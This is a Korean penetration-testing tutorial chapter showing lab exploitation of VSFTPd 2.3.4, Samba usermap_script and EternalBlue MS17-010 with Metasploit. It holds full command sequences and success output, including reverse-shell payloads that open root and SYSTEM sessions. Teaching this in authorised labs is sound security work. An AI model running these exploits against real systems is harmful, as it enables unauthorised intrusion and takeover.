Chapter 07

취약점 분석 & 공격

실제 CVE를 분석하고 익스플로잇하는 과정 — EternalBlue(MS17-010), VSFTPd 백도어, Samba, 그리고 체계적인 공격 방법론

⛔
이 챕터의 모든 실습은 Metasploitable 2 또는 허가된 환경에서만 진행하세요

아래 기술된 모든 공격 기법은 실제 운영 시스템에 사용하면 불법입니다. 반드시 격리된 실습 환경에서만 실행하세요.

🎯 실습 1: VSFTPd 2.3.4 백도어 (CVE-2011-2523)

Metasploitable 2에 설치된 VSFTPd 2.3.4는 특별한 이유로 악명 높습니다. 2011년 공식 배포 서버가 해킹당해 백도어가 심어진 버전이 한동안 유포되었습니다. 사용자 이름에 스마일 이모티콘 :)을 붙이면 6200번 포트로 root 셸이 열립니다.

이 취약점은 소프트웨어 공급망 공격(Supply Chain Attack)의 초기 사례로, 신뢰할 수 있어 보이는 공식 채널을 통해 악성 코드가 배포될 수 있음을 보여준 역사적인 사건입니다.

🔨 VSFTPd 백도어 익스플로잇 전체 과정 
# 1단계: FTP 서비스 버전 확인
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 > set RHOSTS 192.168.56.101
msf6 > run
[+] 192.168.56.101:21 FTP Banner: '220 (vsFTPd 2.3.4)\r\n'

# 2단계: 해당 취약점 검색
msf6 > search vsftpd 2.3.4
#  0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent

# 3단계: 모듈 로드 및 옵션 확인
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > show options

# 4단계: 타깃 설정
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101

# 5단계: 익스플로잇 실행
msf6 exploit(vsftpd_234_backdoor) > exploit

# 성공 시:
[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[+] 192.168.56.101:21 - Backdoor service has been spawned
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened

# 6단계: 셸 확인
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
💡
내부 동작 이해

이 익스플로잇은 FTP 로그인 시도에서 사용자명에 :)가 포함되면 서버가 6200번 포트를 열고 그 포트로 bash를 바인딩하도록 트리거합니다. 모듈이 하는 일은 이 트리거를 발동시키고, 6200번에 TCP 연결을 맺어 셸을 반환하는 것입니다.

🎯 실습 2: Samba "username map script" (CVE-2007-2447)

Metasploitable 2에 설치된 Samba 3.0.20은 사용자명 매핑 기능에 심각한 명령 인젝션 취약점이 있습니다. 인증 없이 원격에서 root 권한 명령 실행이 가능합니다.

🔨 Samba 명령 인젝션 
# SMB 버전 확인으로 취약한 Samba 감지
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 192.168.56.101
msf6 > run
[*] Host is running Unix Samba 3.0.20-Debian

# 취약점 모듈 검색
msf6 > search samba usermap

# 모듈 사용
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 192.168.56.101
msf6 exploit(usermap_script) > set LHOST 192.168.56.100

# 페이로드 설정 (리버스 셸)
msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse_netcat

msf6 exploit(usermap_script) > exploit
[*] Started reverse handler
[+] Command shell session 1 opened

id
uid=0(root) gid=0(root)

🎯 실습 3: MS17-010 EternalBlue (CVE-2017-0144)

EternalBlue는 NSA가 개발하고 Shadow Brokers가 유출한 익스플로잇으로, 2017년 WannaCry 랜섬웨어가 전 세계에 퍼진 핵심 원인입니다. Windows SMBv1 프로토콜의 버퍼 오버플로우 취약점으로, 패치 없는 Windows 7/2008 R2 시스템에 인증 없이 원격 코드 실행이 가능합니다.

⚠️
Windows VM 필요

이 실습은 Windows Server 2008 R2 또는 Windows 7 (패치 없는) VM이 필요합니다. Metasploitable은 Linux 기반이라 해당하지 않습니다. VulnHub 또는 직접 구성한 환경에서 실습하세요.

🔨 EternalBlue 익스플로잇 
# 1단계: MS17-010 취약점 여부 스캔
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 192.168.56.102
msf6 > run
[+] 192.168.56.102:445 - Host is likely VULNERABLE to MS17-010!

# 2단계: EternalBlue 익스플로잇
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.102
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.100
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

msf6 exploit(ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.56.100:4444
[*] 192.168.56.102:445 - Connecting to target for exploitation.
[+] 192.168.56.102:445 - Connection established for exploitation.
[*] Sending stage (200262 bytes)
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

📋 취약점 발견 → 익스플로잇 체계적 접근법

무작정 익스플로잇을 시도하지 않고, 발견한 취약점을 체계적으로 우선순위화하는 방법입니다.

  1. 1
    서비스 버전 정확히 확인

    Nmap -sV 또는 Auxiliary 스캐너로 정확한 버전을 파악합니다. "Apache"가 아니라 "Apache 2.4.49"처럼 구체적이어야 합니다.

  2. 2
    CVE 데이터베이스 검색

    nvd.nist.gov 또는 cve.mitre.org에서 해당 버전의 알려진 CVE를 검색합니다. CVSS 점수 7.0 이상 우선 확인.

  3. 3
    MSF 모듈 존재 여부 확인

    search cve:YYYY-XXXX로 Metasploit 모듈이 있는지 확인합니다. 없다면 Exploit-DB, GitHub에서 PoC를 찾습니다.

  4. 4
    check 명령어로 사전 검증

    모듈이 check를 지원한다면, 실제 익스플로잇 전에 취약 여부를 확인합니다. 불필요한 시스템 충돌을 방지합니다.

  5. 5
    익스플로잇 후 증거 보존

    성공한 세션에서 스크린샷, 사용자 목록, 파일 목록 등 증거를 수집합니다. 보고서 작성의 핵심 근거가 됩니다.
